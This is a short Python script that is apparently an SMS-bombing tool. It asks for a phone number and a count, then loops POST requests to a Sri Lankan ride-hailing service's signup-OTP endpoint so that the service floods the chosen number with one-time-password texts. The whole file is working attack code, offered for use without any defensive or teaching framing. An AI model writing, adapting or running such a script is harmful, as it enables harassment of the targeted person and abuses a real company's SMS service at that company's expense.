import requests
number=str(input("Enter Your Number : "))
amount=int(input("Enter The Amount : "))

url="https://api.savarisrilanka.com/api/tenantIdNextTransportSLProd00001/users/signup-otp/request"
body={"email":"info@savari.lk","numCountryCode":"+94","phoneNum":number,"userType":"passenger"}

for j in range (amount):
	resp=requests.post(url,json=body)

print(str(j+1)+" SMS Sent Successfully")